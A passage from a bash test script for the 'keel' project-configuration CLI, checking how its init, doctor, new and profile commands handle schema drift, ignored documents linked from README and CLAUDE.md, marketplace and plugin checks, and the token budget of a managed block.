  && bad "--team staging" "settings.local.json was staged; it must never be committed" \
  || ok "--team does not stage settings.local.json"
rm -rf "$d"

# Outside a git repo there is no index, so the success line would be a lie.
d="$(mktemp -d)"
printf '{"name":"f","scripts":{"test":"jest"}}\n' > "$d/package.json"
out="$( cd "$d" && "$KEEL" init -y --team 2>&1 )"
case "$out" in
  *"Staged for commit"*) bad "--team without git" "reported staging in a directory with no repo" ;;
  *"not a git repository"*) ok "--team says nothing was staged when there is no repo" ;;
  *) bad "--team without git" "said neither; output was: $out" ;;
esac
rm -rf "$d"

# ---- doctor ---------------------------------------------------------------

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )

# FR-16: doctor says nothing about explain_level. The schema drift message is the whole mechanism
# for getting the key into an existing project, and a nudge for an optional preference key would
# print on every run of every project that is content with the default, which is most of them.
#
# Both states are checked, and the stale one is the point. A freshly initialised profile is already
# at the current schema version, so the drift branch never runs against it: the first version of
# this case checked only that state and therefore could not fail for the reason written above. A
# nudge added inside the drift message would have passed it. Caught in review.
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out" in
    *explain_level*) bad "doctor" "doctor named explain_level on a current profile; FR-16 says the drift message is the whole mechanism" ;;
    *) ok "doctor says nothing about explain_level on a current profile" ;;
esac

python3 - "$d" <<'PY_STALE'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
j = json.loads(p.read_text())
j["schema_version"] = 1
j.get("conventions", {}).pop("explain_level", None)
p.write_text(json.dumps(j, indent=2) + "\n")
PY_STALE
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out" in
    *"schema version"*) ok "doctor reports drift on a profile older than the installed keel" ;;
    *) bad "doctor" "no drift warning on a schema_version 1 profile; that message is how the key reaches an existing project" ;;
esac
case "$out" in
    *explain_level*) bad "doctor" "doctor named explain_level in the drift path; FR-16 says the version message is the whole mechanism" ;;
    *) ok "doctor says nothing about explain_level on a stale profile either" ;;
esac
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
# jest is not installed in the fixture, so verify.test cannot run: doctor must say so.
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then
  bad "doctor verify" "passed with an unrunnable command"
else ok "doctor fails when a verify command does not run"; fi

# Point verify.test at something that works, and doctor should pass.
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["verify"]={"test":"true","test_one":"true","lint":"true","typecheck":None,"build":None,
             "format":None,"e2e":None,"security":None}
p.write_text(json.dumps(d,indent=2)+"\n")
PY
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then ok "doctor passes on a healthy project"
else bad "doctor healthy" "exited non-zero"; fi

# has_ui is written once, at init, and a project grows a user interface later. Nothing re-runs the
# detector after that, so doctor is the only place the drift can surface.
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out" in *"stack.has_ui"*) bad "has_ui drift" "doctor nudged a project with no interface" ;;
  *) ok "doctor says nothing about has_ui on a project with no interface" ;; esac

printf '<!doctype html>\n' > "$d/index.html"
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out" in *"keel profile set stack.has_ui true"*)
    ok "doctor names the command that corrects has_ui drift" ;;
  *) bad "has_ui drift" "doctor said nothing about a project that grew an interface" ;; esac

# A warning and never a failure. The detector reads a bare `public/` directory as an interface, so
# it is right often enough to be worth saying and not right enough to stop anyone working.
( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ) && ok "the has_ui nudge warns without failing" \
  || bad "has_ui drift" "doctor failed over the nudge"
rm -f "$d/index.html"

# A missing test_one is a required field per the commit-guard decision.
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["verify"]["test_one"]=None
p.write_text(json.dumps(d,indent=2)+"\n")
PY
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then bad "doctor test_one" "passed"
else ok "doctor fails when verify.test_one is absent"; fi
rm -rf "$d"

# ---- but a project with no tests at all is a different thing ---------------
# Found by running init on a real project with no test script and no runner. verify.test is a WARN
# and verify.test_one a FAIL, so the profile init had just written failed its own doctor on the
# derived field while the root cause was only a warning, and the init note named the warned field
# rather than the failing one. A missing test_one is an oversight only when there are tests to run.

d="$(fixture node-ts)"
printf '{"name":"f"}\n' > "$d/package.json"; rm -f "$d/tsconfig.json"
out="$( cd "$d" && "$KEEL" init -y 2>&1 )"
case "$out" in *verify.test_one*) ok "the init note names verify.test_one, not just verify.test" ;;
  *) bad "no tests" "the init note never mentioned verify.test_one" ;; esac
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"; rc=$?
case "$out" in *FAIL*test_one*) bad "no tests" "doctor FAILs on test_one where there is no test command either" ;;
  *) ok "doctor does not fail on test_one when verify.test is null too" ;; esac
[ "$rc" -eq 0 ] && ok "and the profile init just wrote passes its own doctor" \
  || bad "no tests" "doctor exited $rc on a project with nothing to run"
rm -rf "$d"

# ---- documents a fresh clone cannot read ----------------------------------
# Both pilots hit this from opposite ends: forex ignored its whole docs root, agroplex ignores 25 of
# its 28 documents and links three of them from the README. The author never sees it, because the
# files are on their disk, and `git status` is structurally blind to ignored files so the natural
# check comes back clean.
#
# Baselined before this check existed. Two agents reviewed agroplex's documentation, one of them
# asked outright what a fresh clone gets. Both read the unreadable files and reported them as
# content problems: "those three linked docs are ~6 months stale" for files that are not in HEAD at
# all, the date coming from `git log`, which answers happily for a path HEAD does not carry. The
# second went on to recommend linking a fourth document that is also ignored.

# The node-ts fixture declares jest, which is not installed, so doctor fails on verify.test alone.
# Without this the exit-code assertions below would hold whether or not the check exists.
runnable_verify() {
    python3 - "$1" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["verify"]={"test":"true","test_one":"true","lint":"true","typecheck":None,"build":None,
             "format":None,"e2e":None,"security":None}
p.write_text(json.dumps(d,indent=2)+"\n")
PY
}

# The agroplex shape exactly: a directory ignored wholesale, one document committed before the rule
# and so still tracked, another removed from the index and now unreachable.
d="$(fixture node-ts)"
( cd "$d" || exit 1
  mkdir -p project_documentation
  printf 'kept\n' > project_documentation/KEPT.md
  printf 'gone\n' > project_documentation/GONE.md
  cat > README.md <<'R'
# f

- [kept](./project_documentation/KEPT.md)
- [gone](./project_documentation/GONE.md)
- [upstream](https://example.com/GONE.md)
R
  git add -A >/dev/null 2>&1 && git commit -q -m init
  git rm -q --cached project_documentation/GONE.md
  printf 'project_documentation/*\n' >> .gitignore
  git add .gitignore >/dev/null 2>&1 && git commit -q -m ignore
  "$KEEL" init -y >/dev/null 2>&1 )
runnable_verify "$d"

out="$( cd "$d" && "$KEEL" doctor 2>&1 || true )"

case "$out" in *"project_documentation/GONE.md"*)
    ok "doctor names a referenced document that is not in HEAD" ;;
  *) bad "referenced docs" "said nothing about a README link a fresh clone cannot open" ;; esac

case "$out" in *"project_documentation/KEPT.md"*)
    bad "referenced docs" "flagged a document that is committed and readable" ;;
  *) ok "doctor leaves the sibling document that is tracked alone" ;; esac

case "$out" in *"example.com"*)
    bad "referenced docs" "flagged an external link, which git cannot carry either way" ;;
  *) ok "doctor ignores links that are not repository paths" ;; esac

# Ignored is a FAIL rather than a WARN: committing does not fix it, the ignore rule has to change
# first, so it is not something the next `git add` clears.
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then
  bad "referenced docs" "doctor passed with a README link no teammate can follow"
else ok "doctor fails on a referenced document the ignore rule keeps out"; fi
rm -rf "$d"

# ---- untracked but not ignored is a warning -------------------------------
# The same defect with a different remedy, and the distinction is the point: this one clears with
# `git add`, so failing on it would fire on every document between being written and being
# committed, which is every document keel itself has just written.

d="$(fixture node-ts)"
( cd "$d" || exit 1
  printf '# f\n\n- [notes](./NOTES.md)\n' > README.md
  printf 'notes\n' > NOTES.md
  git add README.md >/dev/null 2>&1 && git commit -q -m init
  "$KEEL" init -y >/dev/null 2>&1 )
runnable_verify "$d"

out="$( cd "$d" && "$KEEL" doctor 2>&1 || true )"
case "$out" in *WARN*NOTES.md*) ok "an uncommitted referenced document warns rather than fails" ;;
  *) bad "referenced docs" "expected a WARN naming NOTES.md, got: $(printf '%s\n' "$out" | grep -i notes || echo none)" ;; esac
( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ) \
  && ok "and doctor still exits 0 on it" \
  || bad "referenced docs" "doctor failed over a document that only needs committing"
rm -rf "$d"

# ---- a link that climbs out of the docs root ------------------------------
# Found by running the finished check against keel itself, which reported five of its own committed
# files missing. `git cat-file -e HEAD:docs/../templates/x.md` does not resolve: git never
# normalises `..` in a tree path, and a document linking a sibling directory is the common case.

d="$(fixture node-ts)"
( cd "$d" || exit 1
  printf '# f\n' > README.md
  mkdir -p templates
  printf 'x\n' > templates/BLOCK.md
  git add -A >/dev/null 2>&1 && git commit -q -m init
  "$KEEL" init -y >/dev/null 2>&1
  printf '\nSee [the block](../templates/BLOCK.md).\n' >> docs/keel/NEXT-STEPS.md
  git add -A >/dev/null 2>&1 && git commit -q -m docs )
runnable_verify "$d"

out="$( cd "$d" && "$KEEL" doctor 2>&1 || true )"
case "$out" in *BLOCK.md*)
    bad "referenced docs" "reported a committed file as unreadable through a '..' link: $(printf '%s\n' "$out" | grep BLOCK.md)" ;;
  *) ok "a '..' link to a committed file resolves" ;; esac
rm -rf "$d"

# ---- CLAUDE.md and AGENTS.md are read too ---------------------------------
# The two files most likely to point an agent at a document, and the two keel writes into itself.

d="$(fixture node-ts)"
( cd "$d" || exit 1
  printf '# f\n' > README.md
  mkdir -p internal && printf 'x\n' > internal/RULES.md
  printf 'internal/\n' >> .gitignore
  git add -A >/dev/null 2>&1 && git commit -q -m init
  "$KEEL" init -y >/dev/null 2>&1
  printf '\nSee [the rules](internal/RULES.md).\n' >> CLAUDE.md )

out="$( cd "$d" && "$KEEL" doctor 2>&1 || true )"
case "$out" in *"internal/RULES.md"*) ok "doctor reads CLAUDE.md links, not only the README" ;;
  *) bad "referenced docs" "missed an unreadable document linked from CLAUDE.md" ;; esac
rm -rf "$d"

# ---- no profile at all ---------------------------------------------------

d="$(fixture bare)"
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then bad "doctor no profile" "passed"
else ok "doctor fails when there is no profile"; fi
rm -rf "$d"

# ---- keel new -------------------------------------------------------------
# The property that matters: a freshly created project passes its own doctor. If it does not, the
# greenfield path hands someone a project that is already broken.

parent="$(mktemp -d)"
( cd "$parent" && "$KEEL" new svc-node --stack node >/dev/null 2>&1 )
d="$parent/svc-node"

[ -d "$d" ] && ok "new creates the project directory" || bad "new" "no directory"
[ -f "$d/.keel/profile.json" ] && ok "new writes a profile" || bad "new" "no profile"
[ -f "$d/CLAUDE.md" ] && ok "new writes the CLAUDE.md block" || bad "new" "no CLAUDE.md"
[ -d "$d/docs/keel" ] && ok "new scaffolds the docs root" || bad "new" "no docs root"
( cd "$d" && git rev-parse --git-dir >/dev/null 2>&1 ) && ok "new initialises git" || bad "new" "not a repo"
[ -f "$d/.github/workflows/ci.yml" ] && ok "new writes a CI workflow" || bad "new" "no CI"

# The whole point: the generated verify commands must actually run.
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then ok "a new project passes keel doctor"
else bad "new" "doctor fails on a freshly created project"; fi

# And the sample test must genuinely pass, not just exist.
tc="$(prof_of "$d" verify.test)"
if ( cd "$d" && eval "$tc" >/dev/null 2>&1 ); then ok "the generated test command passes"
else bad "new" "generated test command '$tc' fails"; fi

# One commit, so the project has a baseline.
n="$( cd "$d" && git rev-list --count HEAD 2>/dev/null || echo 0 )"
[ "$n" = "1" ] && ok "new makes one initial commit" || bad "new" "expected 1 commit, got $n"
rm -rf "$parent"

# Refuses to write into a non-empty directory.
parent="$(mktemp -d)"; mkdir -p "$parent/taken"; echo x > "$parent/taken/file"
if ( cd "$parent" && "$KEEL" new taken --stack node >/dev/null 2>&1 ); then
  bad "new" "overwrote a non-empty directory"
else ok "new refuses a non-empty directory"; fi
rm -rf "$parent"

# Python stack.
parent="$(mktemp -d)"
( cd "$parent" && "$KEEL" new svc-py --stack python >/dev/null 2>&1 )
got="$(prof_of "$parent/svc-py" stack.language)"
[ "$got" = "python" ] && ok "new supports the python stack" || bad "new python" "got '$got'"
if ( cd "$parent/svc-py" && "$KEEL" doctor >/dev/null 2>&1 ); then ok "a new python project passes doctor"
else bad "new python" "doctor fails"; fi
rm -rf "$parent"

# ---- pre-code repos, and the artifact map --------------------------------
# Found by running init on a real repo that had 30k words of requirements and no code: doctor
# failed on verify.test_one, which a documents-only project can never satisfy, and the skills would
# have looked for a PRD in docs/keel/prd/ while one already existed under another name.

d="$(fixture bare)"
printf '# Requirements\n' > "$d/requirements.md"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" project.kind)"
[ "$got" = "docs" ] && ok "a repo with no source is detected as kind docs" || bad "pre-code" "kind is '$got', want 'docs'"
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then ok "doctor passes on a pre-code repo"
else bad "pre-code" "doctor fails on a documents-only repo, which it can never satisfy"; fi
rm -rf "$d"

# A repo with source is still expected to have a test command.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" project.kind)"
[ "$got" = "service" ] && ok "a repo with source is not marked docs" || bad "kind" "got '$got'"
rm -rf "$d"

# The artifact map: init seeds it, and doctor validates any path that is set.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
if python3 -c "import json,sys;d=json.load(open('$d/.keel/profile.json'));sys.exit(0 if 'artifacts' in d else 1)"; then
  ok "init seeds an artifacts map"; else bad "artifacts" "no artifacts key in the profile"; fi

python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["artifacts"]["prd"]="docs/PROD-042-requirements.md"
p.write_text(json.dumps(d,indent=2)+"\n")
PY
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then
  bad "artifacts" "doctor passed with a mapped path that is missing"
else ok "doctor fails when an artifact path does not exist"; fi

mkdir -p "$d/docs" && printf '# PRD\n' > "$d/docs/PROD-042-requirements.md"
# Neutralise the verify commands, so this case tests the artifact map and nothing else. The fixture's
# `npm test` runs jest, which is not installed, and would fail doctor for an unrelated reason.
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["verify"]={k:("true" if k in ("test","test_one","lint") else None) for k in d["verify"]}
p.write_text(json.dumps(d,indent=2)+"\n")
PY
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then ok "doctor passes once the mapped path exists"
else bad "artifacts" "doctor still fails with a valid mapped path"; fi
rm -rf "$d"

# ---- the marketplace check is advisory, and never mentions gh --------------
# This replaced a check on gh. Doctor used to report that gh was needed to install from the
# private marketplace; it is not, as an install on a machine with no gh proved. The old wording
# sent people to install a tool they did not need. The check that matters is whether the
# marketplace is registered at all, since that is what decides whether a session has any skills.
#
# It stays advisory for the reason the gh check was made advisory, found by CI: a GitHub Actions
# runner has no marketplace registered and is a legitimate state, so failing on it makes doctor
# unusable in every pipeline.

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["verify"]={k:("true" if k in ("test","test_one") else None) for k in d["verify"]}
p.write_text(json.dumps(d,indent=2)+"\n")
PY

# An absent marketplace warns and must not fail, which is the CI case.
if ( cd "$d" && CLAUDE_CONFIG_DIR="$d/empty-config" HOME="$d/empty-home" "$KEEL" doctor >/dev/null 2>&1 ); then
  ok "an unregistered marketplace does not fail doctor"
else bad "marketplace" "doctor failed because no marketplace was registered"; fi

out="$( cd "$d" && CLAUDE_CONFIG_DIR="$d/empty-config" HOME="$d/empty-home" "$KEEL" doctor 2>&1 )"
case "$out" in *"marketplace is not registered"*) ok "doctor names the install command when the marketplace is absent" ;;
  *) bad "marketplace" "doctor said nothing about the missing marketplace" ;; esac

# Registered in CLAUDE_CONFIG_DIR, which is where a profile-based setup keeps it.
mkdir -p "$d/cfg/plugins"
printf '{"keel":{"source":{"source":"github","repo":"gbi-solutions-ltd/keel"}}}\n' \
  > "$d/cfg/plugins/known_marketplaces.json"
out="$( cd "$d" && CLAUDE_CONFIG_DIR="$d/cfg" HOME="$d/empty-home" "$KEEL" doctor 2>&1 )"
case "$out" in *"marketplace is registered"*) ok "doctor finds the marketplace in CLAUDE_CONFIG_DIR" ;;
  *) bad "marketplace" "doctor missed a marketplace in CLAUDE_CONFIG_DIR" ;; esac

# And in the default directory, which is where it lands when CLAUDE_CONFIG_DIR is unset. Both are
# checked because they can differ, and saying "not registered" while it sits in the other one is
# worse than saying nothing. Found on a machine where exactly that was true.
mkdir -p "$d/home/.claude/plugins"
printf '{"keel":{"source":{"source":"github","repo":"gbi-solutions-ltd/keel"}}}\n' \
  > "$d/home/.claude/plugins/known_marketplaces.json"
out="$( cd "$d" && CLAUDE_CONFIG_DIR="$d/empty-config" HOME="$d/home" "$KEEL" doctor 2>&1 )"
case "$out" in *"marketplace is registered"*) ok "doctor falls back to the default config directory" ;;
  *) bad "marketplace" "doctor missed a marketplace in the default directory" ;; esac

case "$out" in *" gh "*) bad "marketplace" "doctor still tells people they need gh" ;;
  *) ok "doctor no longer claims gh is required" ;; esac
rm -rf "$d"

# ---- doctor checks the recommended plugin set -----------------------------
# Specified in docs/04 and never written. Found by the plan sweep.

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["verify"]={k:("true" if k in ("test","test_one") else None) for k in d["verify"]}
p.write_text(json.dumps(d,indent=2)+"\n")
PY
# feature-dev ships a competing pipeline that writes to none of the artifact chain.
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".claude/settings.json"; d=json.loads(p.read_text())
d["enabledPlugins"]["feature-dev@claude-plugins-official"]=True
p.write_text(json.dumps(d,indent=2)+"\n")
PY
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out" in *feature-dev*) ok "doctor warns when feature-dev is enabled alongside keel" ;;
  *) bad "doctor plugins" "no warning about feature-dev" ;; esac
# A warning, not a failure: it is a judgement call the user may have made deliberately.
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then ok "feature-dev warns without failing"
else bad "doctor plugins" "feature-dev made doctor fail; it is advisory"; fi

# A missing recommended plugin is named, not silently ignored.
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".claude/settings.json"; d=json.loads(p.read_text())
d["enabledPlugins"]={k:v for k,v in d["enabledPlugins"].items() if "security-guidance" not in k and "feature-dev" not in k}
p.write_text(json.dumps(d,indent=2)+"\n")
PY
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out" in *security-guidance*) ok "doctor names a missing recommended plugin" ;;
  *) bad "doctor plugins" "silent about a missing recommended plugin" ;; esac

# ---- the managed block's budget --------------------------------------------
#
# doc 05 said "enforced by keel doctor" for this budget from the beginning, and nothing enforced it.
# The block sits in the prefix of every request in the repository, so the cost of a line added here
# is paid per request per engineer, forever, and nothing about a session makes that visible.

b="$(fixture node-ts)"
( cd "$b" && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$b" && "$KEEL" doctor 2>&1 )"
case "$out" in *"keel block is about"*) ok "doctor reports the managed block's token cost" ;;
  *) bad "block budget" "doctor said nothing about the block size" ;; esac

# The shipped block must be inside the ceiling, not merely measured. This is the assertion that
# fails when someone adds a paragraph to the template.
case "$out" in *"over the 700 ceiling"*) bad "block budget" "the shipped block exceeds its own ceiling" ;;
  *) ok "the shipped block is within the 700 token ceiling" ;; esac

# The ceiling is where doctor fails, not what the template aims at. Only the ceiling was asserted
# here, so the template drifted to 518 tokens against its own header's stated 450 and shipped that
# way: every project keel configured then opened with a doctor warning about a block keel wrote,
# which teaches people to read the warning as noise. The target needs its own assertion or it is a
# comment.
case "$out" in *"over the 450 target"*) bad "block budget" "the shipped block exceeds its own 450 token target" ;;
  *) ok "the shipped block is within the 450 token target" ;; esac

# And the check has to bite, or it is a number printed for decoration.
python3 - "$b" <<'PY'
import pathlib, sys
p = pathlib.Path(sys.argv[1]) / "CLAUDE.md"
t = p.read_text()
t = t.replace("<!-- keel:end -->", ("Filler that costs tokens and says nothing at all. " * 90) + "\n<!-- keel:end -->")
p.write_text(t)
PY
if ( cd "$b" && "$KEEL" doctor >/dev/null 2>&1 ); then
    bad "block budget" "an oversized block did not fail doctor"
else
    out="$( cd "$b" && "$KEEL" doctor 2>&1 )"
    case "$out" in *"over the 700 ceiling"*) ok "doctor fails on a block over the ceiling" ;;
      *) bad "block budget" "doctor failed but not because of the block size" ;; esac
fi
rm -rf "$b"

# ---- boundaries against a plugin nobody anticipated ------------------------
#
# The registry of known competing plugins can only name the ones we have met. This is the check that
# does not need to: a plugin shipping a skill name keel also ships is found by reading the
# installed cache, whoever wrote it. The collision is silent in a real session, which is why it is
# worth a warning at all: the model resolves the name to one of the two and records nothing.
rival_cfg="$(mktemp -d)"
mkdir -p "$rival_cfg/plugins/cache/somemarket/rival/1.0.0/skills/tdd"
printf -- '---\nname: tdd\ndescription: Use when writing tests.\n---\n\n# TDD\n' \
  > "$rival_cfg/plugins/cache/somemarket/rival/1.0.0/skills/tdd/SKILL.md"
printf '{"enabledPlugins":{"rival@somemarket":true}}\n' > "$rival_cfg/settings.json"

out="$( cd "$d" && CLAUDE_CONFIG_DIR="$rival_cfg" "$KEEL" doctor 2>&1 )"
case "$out" in *"skill named 'tdd'"*) ok "doctor finds a duplicate skill name from an unknown plugin" ;;
  *) bad "boundaries" "no warning about two plugins shipping 'tdd'" ;; esac
case "$out" in *rival*) ok "the duplicate warning names the other plugin" ;;
  *) bad "boundaries" "the duplicate warning did not say which plugin" ;; esac

# Advisory, like every other boundary finding. Disabling a plugin is the user's call.
if ( cd "$d" && CLAUDE_CONFIG_DIR="$rival_cfg" "$KEEL" doctor >/dev/null 2>&1 ); then
    ok "a duplicate skill name warns without failing"
else bad "boundaries" "a duplicate skill name made doctor fail; it is advisory"; fi

# A plugin whose skills do not overlap must produce nothing. A boundary check that fires on every
# installed plugin is noise, and noise is how a real collision gets scrolled past.
mv "$rival_cfg/plugins/cache/somemarket/rival/1.0.0/skills/tdd" \
   "$rival_cfg/plugins/cache/somemarket/rival/1.0.0/skills/unrelated-thing"
out="$( cd "$d" && CLAUDE_CONFIG_DIR="$rival_cfg" "$KEEL" doctor 2>&1 )"
case "$out" in *"skill named"*) bad "boundaries" "warned about a plugin with no overlapping skill" ;;
  *) ok "a plugin with no overlapping skill produces no boundary warning" ;; esac
rm -rf "$rival_cfg"
rm -rf "$d"

# ---- profile get speaks JSON, not Python ----------------------------------
# Found by running `keel profile set stack.has_ui true` from design-architecture and reading it
# back: the profile holds JSON true and `profile get` returned Python's True, so the value cannot
# round-trip and no shell comparison against `true` works. bin/keel had already grown a workaround
# for this at one call site, accepting both "False" and "false", and not at the other.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$d" && "$KEEL" profile set stack.has_ui true >/dev/null 2>&1 )
[ "$( cd "$d" && "$KEEL" profile get stack.has_ui )" = "true" ] \
  && ok "profile get returns a JSON true, not Python's True" \
  || bad "profile get" "returned '$( cd "$d" && "$KEEL" profile get stack.has_ui )', want 'true'"

( cd "$d" && "$KEEL" profile set stack.has_ui false >/dev/null 2>&1 )
[ "$( cd "$d" && "$KEEL" profile get stack.has_ui )" = "false" ] \
  && ok "and a JSON false" \
  || bad "profile get" "returned '$( cd "$d" && "$KEEL" profile get stack.has_ui )', want 'false'"

# What set writes is what get reads. Without this the two halves of one command disagree.
( cd "$d" && "$KEEL" profile set stack.has_ui "$( cd "$d" && "$KEEL" profile get stack.has_ui )" >/dev/null 2>&1 )
python3 -c "
import json,sys
v=json.load(open('$d/.keel/profile.json'))['stack']['has_ui']
sys.exit(0 if v is False else 1)" \
  && ok "a value read back and set again survives as a boolean" \
  || bad "profile get" "round-tripping through get turned the boolean into something else"
rm -rf "$d"

# The internal reader that compared against Python's spelling must still fire. It is the only thing
# that tells a project its has_ui is wrong, and a silent regression here is invisible.
d="$(fixture node-ts)"
mkdir -p "$d/public"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$d" && "$KEEL" profile set stack.has_ui false >/dev/null 2>&1 )
out="$( cd "$d" && "$KEEL" doctor 2>&1 || true )"
case "$out" in *"stack.has_ui is false, but this project looks like it has a user interface"*)
    ok "doctor still catches a wrong has_ui after the boolean change" ;;
  *) bad "profile get" "the has_ui mismatch warning stopped firing" ;; esac
rm -rf "$d"

# ---- doctor's summary counts its warnings ---------------------------------
# Three warnings scrolled past, then "keel doctor: no problems". Writing the PR body for 0.6.1
# meant counting them by hand to say "no problems and one warning", which is the tell.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$d" && "$KEEL" doctor 2>&1 || true )"
warns="$(printf '%s\n' "$out" | grep -c '^WARN')"
[ "$warns" -gt 0 ] || bad "doctor summary" "fixture produced no warnings, so this proves nothing"
case "$out" in *"keel doctor: no problems, $warns warning"*)
    ok "doctor's summary names the warning count" ;;
  *) bad "doctor summary" "summary ignored $warns warnings: $(printf '%s\n' "$out" | tail -1)" ;; esac
rm -rf "$d"

# ---- what init tells a project to do next ---------------------------------
# Found by running init on an empty directory for a real greenfield project, 2026-08-15. It closed
# by suggesting `use repo-snapshot on this codebase` when there was no codebase, and separately
# demanded verify.test be set by hand on a project that doctor itself excuses. Both messages are the
# first thing a new project reads, and both were wrong for the case the plan calls the more
# important pilot.

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$d" && "$KEEL" init -y 2>&1 )"

case "$out" in *repo-snapshot*) bad "next step" "a project with no code was told to snapshot a codebase" ;;
  *) ok "init does not suggest repo-snapshot where there is no code" ;; esac
case "$out" in *shape-idea*|*write-prd*) ok "init points a pre-implementation project at the artifact chain" ;;
  *) bad "next step" "no useful next step for a greenfield project: $out" ;; esac

# doctor treats kind 'docs' as pre-implementation and says verify commands are not expected. init
# telling the same project to set them by hand is the same state answered two contradictory ways,
# and init's answer is the one read first.
case "$out" in *"no test command was detected"*) bad "next step" "init demanded a test command on a pre-implementation project" ;;
  *) ok "init does not demand verify.test before there is code" ;; esac
rm -rf "$d"

# A project that does have code still gets both, because both are right there.
d="$(fixture node-ts)"
( cd "$d" && rm -f package.json && printf 'const x = 1;\n' > app.ts && git add -A && git commit -qm code )
out="$( cd "$d" && "$KEEL" init -y 2>&1 )"
case "$out" in *repo-snapshot*) ok "a project with code is still pointed at repo-snapshot" ;;
  *) bad "next step" "repo-snapshot was dropped for a project that has code" ;; esac
case "$out" in *"no test command was detected"*) ok "a code project with no test command is still told" ;;
  *) bad "next step" "the missing test command went unreported on a code project" ;; esac
rm -rf "$d"

# ---- the marketplace declaration keel init must not make ------------------
# A marketplace source says where this reader gets keel from, which is a fact about a machine and
# not about a project. Committed to a repository it asserts one answer for everyone who clones it,
# and it was wrong two ways at once: a reader outside the GitHub org cannot reach a private repo,
# and at project scope it shadowed the user's own declaration. Measured on the author's machine:
# user settings declared `gbi` as a directory source at the working repo, and known_marketplaces.json
# had resolved `gbi` to the github source with a clone of the merged main, so every keel project was
# loading published skills rather than the ones being edited.
#
# The working case is in the same function: every @claude-plugins-official plugin is enabled with no
# marketplace declaration at all and resolves fine, because that marketplace is known at user level.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
s=json.load(open('$d/.claude/settings.json'))
sys.exit(0 if 'extraKnownMarketplaces' not in s else 1)" \
  && ok "init declares no marketplace source in the committed settings" \
  || bad "marketplace" "init wrote extraKnownMarketplaces, which is a per-machine fact"

# Three keys out of the one profile in one read. Terse is the default a project gets without
# asking, and the key is written explicitly rather than left absent and defaulted, so a reader can
# see it and change it without first knowing it exists. explain_level is written for the same
# reason: technical is what a project gets without asking.
#
# The watchdog cannot read the window from a session, so gates.context_window is the only correct
# mechanism and nothing wrote it. 200000 is conservative and sometimes wrong, which is acceptable
# only because a configured window is a floor: a larger session raises it in flight rather than
# being stopped at 85% of the wrong number.
{ read -r response_style; read -r explain_level; read -r context_window; } <<EOF
$(prof_of "$d" conventions.response_style conventions.explain_level gates.context_window)
EOF
[ "$response_style" = terse ] \
  && ok "init writes conventions.response_style=terse" \
  || bad "response_style" "init did not write terse"

[ "$explain_level" = technical ] \
  && ok "init writes conventions.explain_level=technical" \
  || bad "explain_level" "init did not write technical"

[ "$context_window" = 200000 ] \
  && ok "init writes gates.context_window=200000" \
  || bad "context_window" "init did not write gates.context_window"

# gates.context_window was already declared by the schema, which is why writing it into init's
# output needed no SCHEMA_VERSION bump. This pins that fact rather than the version number it
# happened to sit at: the literal 1 was unsatisfiable by any legitimate bump, and it blocked the
# first one that came along (conventions.explain_level, 2026-08-18, which does add a key path and
# therefore does require the bump the fingerprint rule demands).
python3 -c "
import json,sys
